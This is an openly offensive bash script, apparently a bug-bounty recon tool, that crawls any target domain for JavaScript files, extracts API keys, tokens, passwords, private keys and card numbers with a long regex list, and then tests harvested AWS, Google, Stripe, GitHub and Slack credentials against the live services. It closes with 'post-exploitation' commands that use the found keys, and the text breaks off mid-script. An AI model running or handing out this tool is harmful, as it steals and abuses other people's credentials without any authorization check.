#!/bin/bash
# 🔥 Elite JavaScript Secrets & API Keys Extraction Script
# CoffinXP's Advanced JS Analysis Methodology

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./js_secrets_extraction.sh target.com"
    exit 1
fi

echo "🚀 Starting JavaScript Secrets Extraction Hunt for $TARGET"
mkdir -p $TARGET/js_secrets && cd $TARGET/js_secrets

# ==================== JAVASCRIPT FILE DISCOVERY ====================
echo "🔍 Phase 1: JavaScript File Discovery"

# Get all live URLs first
if [ ! -f "../live_urls.txt" ]; then
    echo "📡 Discovering live URLs first..."
    echo $TARGET | httpx -silent > ../live_urls.txt
fi

echo "🕷️ Crawling for JavaScript files..."

# Use multiple methods to find JS files
echo "Method 1: Using katana for deep crawling..."
cat ../live_urls.txt | katana -d 5 -js-crawl -known-files all -silent | grep -E "\\.js(\?|$)" | sort -u > js_files_katana.txt

echo "Method 2: Using waybackurls for historical JS files..."
cat ../live_urls.txt | waybackurls | grep -E "\\.js(\?|$)" | sort -u > js_files_wayback.txt

echo "Method 3: Using gau for URL gathering..."
cat ../live_urls.txt | gau --threads 5 | grep -E "\\.js(\?|$)" | sort -u > js_files_gau.txt

echo "Method 4: Manual endpoint discovery..."
cat > common_js_paths.txt << 'EOF'
/js/app.js
/js/main.js
/js/bundle.js
/js/vendor.js
/js/config.js
/js/api.js
/js/auth.js
/js/admin.js
/js/dashboard.js
/js/login.js
/js/user.js
/js/settings.js
/assets/js/app.js
/assets/js/main.js
/assets/js/bundle.js
/static/js/app.js
/static/js/main.js
/static/js/bundle.js
/dist/js/app.js
/dist/js/main.js
/dist/js/bundle.js
/build/js/app.js
/build/js/main.js
/build/js/bundle.js
/public/js/app.js
/public/js/main.js
/public/js/bundle.js
/resources/js/app.js
/resources/js/main.js
/wp-content/themes/*/js/
/wp-includes/js/
/sites/all/themes/*/js/
/themes/*/js/
/modules/*/js/
/plugins/*/js/
/extensions/*/js/
/addons/*/js/
EOF

# Test common JS paths
echo "Testing common JavaScript paths..."
for url in $(cat ../live_urls.txt); do
    for js_path in $(cat common_js_paths.txt); do
        full_url="$url$js_path"
        echo "$full_url"
    done
done | httpx -silent -mc 200 -content-type | grep "application/javascript\|text/javascript" | awk '{print $1}' > js_files_manual.txt

# Combine all JS files
cat js_files_*.txt | sort -u > all_js_files.txt
echo "✅ Found $(wc -l < all_js_files.txt) JavaScript files"

# ==================== JAVASCRIPT CONTENT EXTRACTION ====================
echo "📥 Phase 2: JavaScript Content Extraction"

# Download all JS files
mkdir -p js_content
echo "Downloading JavaScript files..."

counter=1
while read -r js_url; do
    if [ ! -z "$js_url" ]; then
        echo "Downloading [$counter]: $js_url"
        filename="js_content/$(echo $js_url | sed 's|https\?://||g' | tr '/' '_' | tr '?' '_' | tr '&' '_').js"
        
        # Download with proper headers
        curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
             -H "Accept: application/javascript, text/javascript, */*" \
             "$js_url" -o "$filename"
        
        # Check if file was downloaded successfully
        if [ -s "$filename" ]; then
            echo "  ✅ Downloaded: $(wc -c < "$filename") bytes"
        else
            echo "  ❌ Failed to download"
            rm -f "$filename"
        fi
        
        counter=$((counter + 1))
        
        # Rate limiting
        sleep 0.1
    fi
done < all_js_files.txt

echo "✅ Downloaded $(ls js_content/*.js 2>/dev/null | wc -l) JavaScript files"

# ==================== SECRETS & API KEYS EXTRACTION ====================
echo "🔑 Phase 3: Secrets & API Keys Extraction"

# Create comprehensive regex patterns for secrets
cat > secret_patterns.txt << 'EOF'
# AWS Keys
AKIA[0-9A-Z]{16}
aws_access_key_id.*[=:]\s*["\']?([A-Z0-9]{20})["\']?
aws_secret_access_key.*[=:]\s*["\']?([A-Za-z0-9/+=]{40})["\']?

# Google API Keys
AIza[0-9A-Za-z\\-_]{35}
ya29\\.[0-9A-Za-z\\-_]+

# GitHub Tokens
ghp_[0-9A-Za-z]{36}
gho_[0-9A-Za-z]{36}
ghu_[0-9A-Za-z]{36}
ghs_[0-9A-Za-z]{36}
ghr_[0-9A-Za-z]{36}

# Stripe Keys
sk_live_[0-9a-zA-Z]{24}
sk_test_[0-9a-zA-Z]{24}
pk_live_[0-9a-zA-Z]{24}
pk_test_[0-9a-zA-Z]{24}
rk_live_[0-9a-zA-Z]{24}
rk_test_[0-9a-zA-Z]{24}

# PayPal
access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}
access_token\\$sandbox\\$[0-9a-z]{16}\\$[0-9a-f]{32}

# Square
sq0atp-[0-9A-Za-z\\-_]{22}
sq0csp-[0-9A-Za-z\\-_]{43}

# Twilio
SK[0-9a-fA-F]{32}
AC[a-zA-Z0-9_\\-]{32}

# SendGrid
SG\\.[0-9A-Za-z\\-_]{22}\\.[0-9A-Za-z\\-_]{43}

# Mailgun
key-[0-9a-zA-Z]{32}

# Firebase
[0-9a-zA-Z_\\-]{22}:[0-9a-zA-Z_\\-]{8}

# Slack
xox[baprs]-([0-9a-zA-Z]{10,48})

# Discord
[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27}
mfa\\.[\\w-]{84}

# Twitter
[1-9][0-9]+-[0-9a-zA-Z]{40}

# Facebook
EAACEdEose0cBA[0-9A-Za-z]+

# LinkedIn
[a-z\\d]{12}

# Instagram
[0-9]{13}\\.[0-9a-f]{32}

# Dropbox
sl\\.[0-9A-Za-z\\-_=]{135}

# Box
[0-9a-f]{32}

# Generic API Keys
api[_-]?key["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
apikey["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
api[_-]?secret["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
secret[_-]?key["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
access[_-]?token["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
auth[_-]?token["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
bearer["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})

# Database Connections
mongodb://[^\\s"']+
mysql://[^\\s"']+
postgresql://[^\\s"']+
redis://[^\\s"']+
sqlite://[^\\s"']+

# JWT Tokens
eyJ[A-Za-z0-9-_=]+\\.[A-Za-z0-9-_=]+\\.?[A-Za-z0-9-_.+/=]*

# Private Keys
-----BEGIN [A-Z ]+PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN RSA PRIVATE KEY-----
-----BEGIN DSA PRIVATE KEY-----
-----BEGIN EC PRIVATE KEY-----

# Passwords and Secrets
password["\']?\\s*[=:]\\s*["\']?([^"'\\s]{8,})
passwd["\']?\\s*[=:]\\s*["\']?([^"'\\s]{8,})
pwd["\']?\\s*[=:]\\s*["\']?([^"'\\s]{8,})
secret["\']?\\s*[=:]\\s*["\']?([^"'\\s]{8,})

# URLs with credentials
https?://[^\\s"']*:[^\\s"']*@[^\\s"']+

# Email addresses (potential usernames)
[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}

# Phone numbers
\\+?[1-9]\\d{1,14}

# Credit card numbers (for testing environments)
4[0-9]{12}(?:[0-9]{3})?
5[1-5][0-9]{14}
3[47][0-9]{13}
3[0-9]{13}
6(?:011|5[0-9]{2})[0-9]{12}

# IP Addresses (internal networks)
192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}
10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}
172\\.(1[6-9]|2[0-9]|3[0-1])\\.[0-9]{1,3}\\.[0-9]{1,3}

# Localhost variations
127\\.0\\.0\\.1
localhost
0\\.0\\.0\\.0

# Common sensitive variable names
client[_-]?id["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{8,})
client[_-]?secret["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
app[_-]?id["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{8,})
app[_-]?secret["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
consumer[_-]?key["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
consumer[_-]?secret["\']?\\s*[=:]\\s*["\']?([0-9a-zA-Z\\-_=+/]{16,})
EOF

echo "🔍 Extracting secrets from JavaScript files..."

# Extract secrets using regex patterns
> all_secrets.txt
> high_confidence_secrets.txt
> medium_confidence_secrets.txt
> low_confidence_secrets.txt

for js_file in js_content/*.js; do
    if [ -f "$js_file" ]; then
        echo "Analyzing: $(basename "$js_file")"
        
        # High confidence patterns (specific API key formats)
        grep -oE "AKIA[0-9A-Z]{16}" "$js_file" >> high_confidence_secrets.txt
        grep -oE "AIza[0-9A-Za-z\\-_]{35}" "$js_file" >> high_confidence_secrets.txt
        grep -oE "sk_live_[0-9a-zA-Z]{24}" "$js_file" >> high_confidence_secrets.txt
        grep -oE "sk_test_[0-9a-zA-Z]{24}" "$js_file" >> high_confidence_secrets.txt
        grep -oE "ghp_[0-9A-Za-z]{36}" "$js_file" >> high_confidence_secrets.txt
        grep -oE "xox[baprs]-([0-9a-zA-Z]{10,48})" "$js_file" >> high_confidence_secrets.txt
        
        # Medium confidence patterns (generic API keys)
        grep -oiE "api[_-]?key[\"']?\\s*[=:]\\s*[\"']?([0-9a-zA-Z\\-_=+/]{20,})" "$js_file" >> medium_confidence_secrets.txt
        grep -oiE "secret[_-]?key[\"']?\\s*[=:]\\s*[\"']?([0-9a-zA-Z\\-_=+/]{20,})" "$js_file" >> medium_confidence_secrets.txt
        grep -oiE "access[_-]?token[\"']?\\s*[=:]\\s*[\"']?([0-9a-zA-Z\\-_=+/]{20,})" "$js_file" >> medium_confidence_secrets.txt
        
        # JWT tokens
        grep -oE "eyJ[A-Za-z0-9-_=]+\\.[A-Za-z0-9-_=]+\\.?[A-Za-z0-9-_.+/=]*" "$js_file" >> medium_confidence_secrets.txt
        
        # Database connections
        grep -oE "mongodb://[^\\s\"']+|mysql://[^\\s\"']+|postgresql://[^\\s\"']+|redis://[^\\s\"']+|sqlite://[^\\s\"']+|" "$js_file" >> high_confidence_secrets.txt
        
        # URLs with credentials
        grep -oE "https?://[^\\s\"']*:[^\\s\"']*@[^\\s\"']+|" "$js_file" >> high_confidence_secrets.txt
        
        # Low confidence patterns (passwords, emails, etc.)
        grep -oiE "password[\"']?\\s*[=:]\\s*[\"']?([^\"'\\s]{8,})" "$js_file" >> low_confidence_secrets.txt
        grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}" "$js_file" >> low_confidence_secrets.txt
        
        # Internal IP addresses
        grep -oE "192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}|10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.(1[6-9]|2[0-9]|3[0-1])\\.[0-9]{1,3}\\.[0-9]{1,3}" "$js_file" >> low_confidence_secrets.txt
        
        # All findings combined
        cat high_confidence_secrets.txt medium_confidence_secrets.txt low_confidence_secrets.txt >> all_secrets.txt
    fi
done

# Remove duplicates and empty lines
sort -u high_confidence_secrets.txt | grep -v "^$" > high_confidence_unique.txt
sort -u medium_confidence_secrets.txt | grep -v "^$" > medium_confidence_unique.txt
sort -u low_confidence_secrets.txt | grep -v "^$" > low_confidence_unique.txt
sort -u all_secrets.txt | grep -v "^$" > all_secrets_unique.txt

echo "✅ Secrets extraction completed!"
echo "   High confidence: $(wc -l < high_confidence_unique.txt) secrets"
echo "   Medium confidence: $(wc -l < medium_confidence_unique.txt) secrets"
echo "   Low confidence: $(wc -l < low_confidence_unique.txt) secrets"

# ==================== ADVANCED JAVASCRIPT ANALYSIS ====================
echo "🔬 Phase 4: Advanced JavaScript Analysis"

# Create advanced JS analysis script
cat > advanced_js_analysis.py << 'EOF'
#!/usr/bin/env python3
import re
import os
import json
import base64
import urllib.parse
from pathlib import Path

class AdvancedJSAnalyzer:
    def __init__(self, js_directory):
        self.js_directory = js_directory
        self.findings = {
            'api_endpoints': [],
            'sensitive_functions': [],
            'hardcoded_credentials': [],
            'debug_info': [],
            'source_maps': [],
            'webpack_chunks': [],
            'obfuscated_code': [],
            'eval_usage': [],
            'xhr_requests': [],
            'websocket_connections': [],
            'local_storage_usage': [],
            'cookie_operations': []
        }
    
    def analyze_all_files(self):
        """Analyze all JavaScript files in the directory"""
        js_files = list(Path(self.js_directory).glob('*.js'))
        
        for js_file in js_files:
            print(f"🔍 Analyzing: {js_file.name}")
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    self.analyze_content(content, js_file.name)
            except Exception as e:
                print(f"   ❌ Error reading {js_file}: {e}")
        
        return self.findings
    
    def analyze_content(self, content, filename):
        """Analyze JavaScript content for various security issues"""
        
        # 1. Extract API endpoints
        api_patterns = [
            r'["\']https?://[^"\']+/api/[^"\']*["\']',
            r'["\']https?://[^"\']+/v\d+/[^"\']*["\']',
            r'["\']https?://api\.[^"\']+["\']',
            r'["\']https?://[^"\']*\.api\.[^"\']+["\']',
            r'["\']https?://[^"\']+/rest/[^"\']*["\']',
            r'["\']https?://[^"\']+/graphql[^"\']*["\']',
            r'["\']https?://[^"\']+/webhook[^"\']*["\']',
            r'["\']https?://[^"\']+/callback[^"\']*["\']'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                self.findings['api_endpoints'].append({
                    'file': filename,
                    'endpoint': match.strip('"\''),
                    'pattern': pattern
                })
        
        # 2. Find sensitive functions
        sensitive_functions = [
            r'eval\s*\(',
            r'Function\s*\(',
            r'setTimeout\s*\([^,]*["\'][^"\']*["\']',
            r'setInterval\s*\([^,]*["\'][^"\']*["\']',
            r'document\.write\s*\(',
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'insertAdjacentHTML\s*\(',
            r'execScript\s*\(',
            r'msWriteProfilerMark\s*\('
        ]
        
        for func_pattern in sensitive_functions:
            matches = re.findall(func_pattern, content, re.IGNORECASE)
            if matches:
                self.findings['sensitive_functions'].append({
                    'file': filename,
                    'function': func_pattern,
                    'count': len(matches)
                })
        
        # 3. Extract hardcoded credentials
        cred_patterns = [
            r'password\s*[=:]\s*["\'][^"\']{6,}["\']',
            r'passwd\s*[=:]\s*["\'][^"\']{6,}["\']',
            r'secret\s*[=:]\s*["\'][^"\']{10,}["\']',
            r'token\s*[=:]\s*["\'][^"\']{10,}["\']',
            r'key\s*[=:]\s*["\'][^"\']{10,}["\']',
            r'auth\s*[=:]\s*["\'][^"\']{10,}["\']'
        ]
        
        for cred_pattern in cred_patterns:
            matches = re.findall(cred_pattern, content, re.IGNORECASE)
            for match in matches:
                self.findings['hardcoded_credentials'].append({
                    'file': filename,
                    'credential': match,
                    'pattern': cred_pattern
                })
        
        # 4. Find debug information
        debug_patterns = [
            r'console\.(log|debug|info|warn|error)\s*\([^)]*\)',
            r'debugger\s*;',
            r'alert\s*\([^)]*\)',
            r'confirm\s*\([^)]*\)',
            r'prompt\s*\([^)]*\)'
        ]
        
        for debug_pattern in debug_patterns:
            matches = re.findall(debug_pattern, content, re.IGNORECASE)
            if matches:
                self.findings['debug_info'].append({
                    'file': filename,
                    'debug_type': debug_pattern,
                    'count': len(matches)
                })
        
        # 5. Check for source maps
        if '//# sourceMappingURL=' in content or '//@ sourceMappingURL=' in content:
            sourcemap_matches = re.findall(r'//[#@] sourceMappingURL=([^\s]+)', content)
            for sourcemap in sourcemap_matches:
                self.findings['source_maps'].append({
                    'file': filename,
                    'sourcemap': sourcemap
                })
        
        # 6. Detect webpack chunks and modules
        webpack_patterns = [
            r'webpackJsonp\s*\(',
            r'__webpack_require__',
            r'webpackChunkName',
            r'module\.exports\s*=',
            r'exports\[.*\]\s*='
        ]
        
        for webpack_pattern in webpack_patterns:
            if re.search(webpack_pattern, content):
                self.findings['webpack_chunks'].append({
                    'file': filename,
                    'pattern': webpack_pattern
                })
        
        # 7. Detect obfuscated code
        obfuscation_indicators = [
            len(re.findall(r'[a-zA-Z_$][a-zA-Z0-9_$]*', content)) > 1000,  # Many short variables
            content.count('\\x') > 50,  # Hex encoding
            content.count('\\u') > 20,  # Unicode encoding
            len([x for x in content.split() if len(x) > 50]) > 10,  # Long strings
            content.count('eval') > 5,  # Multiple evals
            content.count('String.fromCharCode') > 5  # Character encoding
        ]
        
        if any(obfuscation_indicators):
            self.findings['obfuscated_code'].append({
                'file': filename,
                'indicators': sum(obfuscation_indicators),
                'likely_obfuscated': sum(obfuscation_indicators) > 2
            })
        
        # 8. Find XHR/Fetch requests
        xhr_patterns = [
            r'XMLHttpRequest\s*\(',
            r'fetch\s*\([^)]*\)',
            r'axios\.[a-z]+\s*\(',
            r'\$\.ajax\s*\(',
            r'\$\.get\s*\(',
            r'\$\.post\s*\('
        ]
        
        for xhr_pattern in xhr_patterns:
            matches = re.findall(xhr_pattern, content, re.IGNORECASE)
            if matches:
                self.findings['xhr_requests'].append({
                    'file': filename,
                    'request_type': xhr_pattern,
                    'count': len(matches)
                })
        
        # 9. Find WebSocket connections
        websocket_patterns = [
            r'new\s+WebSocket\s*\([^)]*\)',
            r'ws://[^"\'\\s]+',
            r'wss://[^"\'\\s]+'
        ]
        
        for ws_pattern in websocket_patterns:
            matches = re.findall(ws_pattern, content, re.IGNORECASE)
            for match in matches:
                self.findings['websocket_connections'].append({
                    'file': filename,
                    'websocket': match
                })
        
        # 10. Find localStorage/sessionStorage usage
        storage_patterns = [
            r'localStorage\.[a-zA-Z]+\s*\([^)]*\)',
            r'sessionStorage\.[a-zA-Z]+\s*\([^)]*\)',
            r'localStorage\[[^]]+\]',
            r'sessionStorage\[[^]]+\]'
        ]
        
        for storage_pattern in storage_patterns:
            matches = re.findall(storage_pattern, content, re.IGNORECASE)
            if matches:
                self.findings['local_storage_usage'].append({
                    'file': filename,
                    'storage_type': storage_pattern,
                    'count': len(matches)
                })
        
        # 11. Find cookie operations
        cookie_patterns = [
            r'document\.cookie\s*=',
            r'document\.cookie',
            r'getCookie\s*\(',
            r'setCookie\s*\(',
            r'deleteCookie\s*\('
        ]
        
        for cookie_pattern in cookie_patterns:
            matches = re.findall(cookie_pattern, content, re.IGNORECASE)
            if matches:
                self.findings['cookie_operations'].append({
                    'file': filename,
                    'cookie_operation': cookie_pattern,
                    'count': len(matches)
                })
    
    def generate_report(self):
        """Generate a comprehensive analysis report"""
        report = "🔬 Advanced JavaScript Analysis Report\n"
        report += "=" * 50 + "\n\n"
        
        for category, findings in self.findings.items():
            if findings:
                report += f"📊 {category.upper().replace('_', ' ')}:\n"
                report += "-" * 30 + "\n"
                
                if category == 'api_endpoints':
                    unique_endpoints = list(set([f['endpoint'] for f in findings]))
                    for endpoint in unique_endpoints:
                        report += f"  🎯 {endpoint}\n"
                
                elif category == 'hardcoded_credentials':
                    for cred in findings:
                        report += f"  🔑 {cred['file']}: {cred['credential']}\n"
                
                elif category == 'source_maps':
                    for sm in findings:
                        report += f"  🗺️ {sm['file']}: {sm['sourcemap']}\n"
                
                elif category == 'websocket_connections':
                    for ws in findings:
                        report += f"  🔌 {ws['file']}: {ws['websocket']}\n"
                
                else:
                    report += f"  📈 Found {len(findings)} instances\n"
                
                report += "\n"
        
        return report

def main():
    analyzer = AdvancedJSAnalyzer('js_content')
    findings = analyzer.analyze_all_files()
    
    # Generate and save report
    report = analyzer.generate_report()
    with open('advanced_js_analysis_report.txt', 'w') as f:
        f.write(report)
    
    # Save findings as JSON
    with open('js_analysis_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)
    
    print("✅ Advanced JavaScript analysis completed!")
    print("📊 Report saved to: advanced_js_analysis_report.txt")
    print("📄 JSON data saved to: js_analysis_findings.json")

if __name__ == "__main__":
    main()
EOF

chmod +x advanced_js_analysis.py

# Run advanced analysis if JS files exist
if [ -d "js_content" ] && [ "$(ls -A js_content)" ]; then
    echo "🔬 Running advanced JavaScript analysis..."
    python3 advanced_js_analysis.py
fi

# ==================== API KEY VALIDATION ====================
echo "✅ Phase 5: API Key Validation"

# Create API key validation script
cat > validate_api_keys.py << 'EOF'
#!/usr/bin/env python3
import requests
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

class APIKeyValidator:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
    
    def validate_aws_key(self, access_key, secret_key=None):
        """Validate AWS access key"""
        try:
            # Try to make a simple AWS API call
            import boto3
            from botocore.exceptions import ClientError, NoCredentialsError
            
            if secret_key:
                client = boto3.client(
                    'sts',
                    aws_access_key_id=access_key,
                    aws_secret_access_key=secret_key
                )
                
                try:
                    response = client.get_caller_identity()
                    return {
                        'valid': True,
                        'service': 'AWS',
                        'key': access_key,
                        'info': f"Account: {response.get('Account', 'Unknown')}"
                    }
                except ClientError as e:
                     
                    return {
                        'valid': False,
                        'service': 'AWS',
                        'key': access_key,
                        'error': str(e)
                    }
        except ImportError:
            # boto3 not available, try HTTP request
            pass
        
        return {'valid': False, 'service': 'AWS', 'key': access_key, 'error': 'Cannot validate without secret key'}
    
    def validate_google_api_key(self, api_key):
        """Validate Google API key"""
        try:
            # Try Google Maps API
            url = f"https://maps.googleapis.com/maps/api/geocode/json?address=test&key={api_key}"
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') != 'REQUEST_DENIED':
                    return {
                        'valid': True,
                        'service': 'Google API',
                        'key': api_key,
                        'info': f"Status: {data.get('status', 'Unknown')}"
                    }
            
            # Try YouTube API
            url = f"https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&key={api_key}"
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                return {
                    'valid': True,
                    'service': 'Google YouTube API',
                    'key': api_key,
                    'info': 'YouTube API accessible'
                }
            
        except Exception as e:
            pass
        
        return {'valid': False, 'service': 'Google API', 'key': api_key, 'error': 'Invalid or restricted'}
    
    def validate_stripe_key(self, api_key):
        """Validate Stripe API key"""
        try:
            url = "https://api.stripe.com/v1/account"
            headers = {'Authorization': f'Bearer {api_key}'}
            response = self.session.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                return {
                    'valid': True,
                    'service': 'Stripe',
                    'key': api_key,
                    'info': f"Account: {data.get('display_name', 'Unknown')}"
                }
            elif response.status_code == 401:
                return {'valid': False, 'service': 'Stripe', 'key': api_key, 'error': 'Invalid key'}
            
        except Exception as e:
            pass
        
        return {'valid': False, 'service': 'Stripe', 'key': api_key, 'error': 'Validation failed'}
    
    def validate_github_token(self, token):
        """Validate GitHub token"""
        try:
            url = "https://api.github.com/user"
            headers = {'Authorization': f'token {token}'}
            response = self.session.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                return {
                    'valid': True,
                    'service': 'GitHub',
                    'key': token,
                    'info': f"User: {data.get('login', 'Unknown')}"
                }
            elif response.status_code == 401:
                return {'valid': False, 'service': 'GitHub', 'key': token, 'error': 'Invalid token'}
            
        except Exception as e:
            pass
        
        return {'valid': False, 'service': 'GitHub', 'key': token, 'error': 'Validation failed'}
    
    def validate_slack_token(self, token):
        """Validate Slack token"""
        try:
            url = "https://slack.com/api/auth.test"
            headers = {'Authorization': f'Bearer {token}'}
            response = self.session.post(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return {
                        'valid': True,
                        'service': 'Slack',
                        'key': token,
                        'info': f"Team: {data.get('team', 'Unknown')}"
                    }
            
        except Exception as e:
            pass
        
        return {'valid': False, 'service': 'Slack', 'key': token, 'error': 'Invalid token'}
    
    def validate_key(self, key):
        """Determine key type and validate"""
        key = key.strip().strip('"\'')
        
        # AWS Access Key
        if re.match(r'^AKIA[0-9A-Z]{16}$', key):
            return self.validate_aws_key(key)
        
        # Google API Key
        elif re.match(r'^AIza[0-9A-Za-z\-_]{35}$', key):
            return self.validate_google_api_key(key)
        
        # Stripe Key
        elif re.match(r'^sk_(live|test)_[0-9a-zA-Z]{24}$', key):
            return self.validate_stripe_key(key)
        
        # GitHub Token
        elif re.match(r'^ghp_[0-9A-Za-z]{36}$', key):
            return self.validate_github_token(key)
        
        # Slack Token
        elif re.match(r'^xox[baprs]-', key):
            return self.validate_slack_token(key)
        
        else:
            return {'valid': False, 'service': 'Unknown', 'key': key, 'error': 'Unknown key format'}
    
    def validate_keys_from_file(self, filename):
        """Validate all keys from a file"""
        try:
            with open(filename, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            
            print(f"🔍 Validating {len(keys)} API keys...")
            
            # Use threading for faster validation
            with ThreadPoolExecutor(max_workers=5) as executor:
                future_to_key = {executor.submit(self.validate_key, key): key for key in keys}
                
                for future in as_completed(future_to_key):
                    result = future.result()
                    self.results.append(result)
                    
                    if result['valid']:
                        print(f"✅ VALID: {result['service']} - {result['key'][:20]}...")
                    else:
                        print(f"❌ Invalid: {result['service']} - {result['key'][:20]}...")
                    
                    # Rate limiting
                    time.sleep(0.1)
            
            return self.results
            
        except FileNotFoundError:
            print(f"❌ File not found: {filename}")
            return []

def main():
    validator = APIKeyValidator()
    
    # Validate high confidence secrets
    if os.path.exists('high_confidence_unique.txt'):
        print("🔑 Validating high confidence API keys...")
        results = validator.validate_keys_from_file('high_confidence_unique.txt')
        
        # Save results
        with open('api_validation_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        # Generate summary
        valid_keys = [r for r in results if r['valid']]
        invalid_keys = [r for r in results if not r['valid']]
        
        print(f"\n📊 Validation Summary:")
        print(f"   ✅ Valid keys: {len(valid_keys)}")
        print(f"   ❌ Invalid keys: {len(invalid_keys)}")
        
        if valid_keys:
            print(f"\n🚨 CRITICAL: Found {len(valid_keys)} valid API keys!")
            for key in valid_keys:
                print(f"   🔑 {key['service']}: {key['key'][:20]}... - {key.get('info', '')}")
    
    else:
        print("❌ No high confidence secrets file found")

if __name__ == "__main__":
    main()
EOF

chmod +x validate_api_keys.py

# Run API key validation if secrets were found
if [ -s high_confidence_unique.txt ]; then
    echo "🔑 Validating discovered API keys..."
    python3 validate_api_keys.py
fi

# ==================== RESULTS COMPILATION ====================
echo "📊 Phase 6: Results Compilation"

echo "🎯 JavaScript Secrets & API Keys Extraction Results" > js_secrets_summary.txt
echo "====================================================" >> js_secrets_summary.txt
echo "" >> js_secrets_summary.txt

# JavaScript files discovered
if [ -s all_js_files.txt ]; then
    echo "📁 JAVASCRIPT FILES DISCOVERED:" >> js_secrets_summary.txt
    echo "Total files: $(wc -l < all_js_files.txt)" >> js_secrets_summary.txt
    echo "Downloaded: $(ls js_content/*.js 2>/dev/null | wc -l)" >> js_secrets_summary.txt
    echo "" >> js_secrets_summary.txt
fi

# Secrets found
if [ -s high_confidence_unique.txt ]; then
    echo "🚨 HIGH CONFIDENCE SECRETS:" >> js_secrets_summary.txt
    echo "Count: $(wc -l < high_confidence_unique.txt)" >> js_secrets_summary.txt
    head -10 high_confidence_unique.txt >> js_secrets_summary.txt
    echo "" >> js_secrets_summary.txt
fi

if [ -s medium_confidence_unique.txt ]; then
    echo "⚠️ MEDIUM CONFIDENCE SECRETS:" >> js_secrets_summary.txt
    echo "Count: $(wc -l < medium_confidence_unique.txt)" >> js_secrets_summary.txt
    echo "" >> js_secrets_summary.txt
fi

if [ -s low_confidence_unique.txt ]; then
    echo "ℹ️ LOW CONFIDENCE FINDINGS:" >> js_secrets_summary.txt
    echo "Count: $(wc -l < low_confidence_unique.txt)" >> js_secrets_summary.txt
    echo "" >> js_secrets_summary.txt
fi

# API validation results
if [ -s api_validation_results.json ]; then
    echo "✅ API KEY VALIDATION RESULTS:" >> js_secrets_summary.txt
    valid_count=$(jq '[.[] | select(.valid == true)] | length' api_validation_results.json 2>/dev/null || echo "0")
    echo "Valid API keys found: $valid_count" >> js_secrets_summary.txt
    echo "" >> js_secrets_summary.txt
fi

# Advanced analysis results
if [ -s advanced_js_analysis_report.txt ]; then
    echo "🔬 ADVANCED ANALYSIS HIGHLIGHTS:" >> js_secrets_summary.txt
    grep -E "API ENDPOINTS|HARDCODED CREDENTIALS|SOURCE MAPS" advanced_js_analysis_report.txt >> js_secrets_summary.txt
    echo "" >> js_secrets_summary.txt
fi

echo "📁 Files created:" >> js_secrets_summary.txt
ls -la *.txt *.json *.py 2>/dev/null >> js_secrets_summary.txt

echo "✅ JavaScript Secrets & API Keys extraction completed!"
echo "📊 Check js_secrets_summary.txt for results overview"

# ==================== ELITE EXPLOITATION COMMANDS ====================
echo "💀 Creating elite post-exploitation commands..."

cat > js_secrets_exploitation.sh << 'EOF'
#!/bin/bash
# Elite JavaScript secrets exploitation commands

echo "🔥 Elite JavaScript Secrets Exploitation Commands"
echo "================================================="

echo "1. 🔑 API Key Testing Commands:"
echo "   # Test AWS keys"
echo "   aws sts get-caller-identity --profile test"
echo "   aws s3 ls --profile test"
echo ""
echo "   # Test Google API keys"
echo "   curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key=YOUR_KEY'"
echo "   curl 'https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&key=YOUR_KEY'"
echo ""
echo "   # Test Stripe keys"
echo "   curl https://api.stripe.com/v1/account -H 'Authorization: Bearer YOUR_KEY'"
echo ""
echo "   # Test GitHub tokens"
echo "   curl -H 'Authorization: token YOUR_TOKEN' https://api.github.com/user"

echo ""
echo "2. 🕷️ Advanced JavaScript Crawling:"
echo "   # Find more JS files using discovered endpoints"
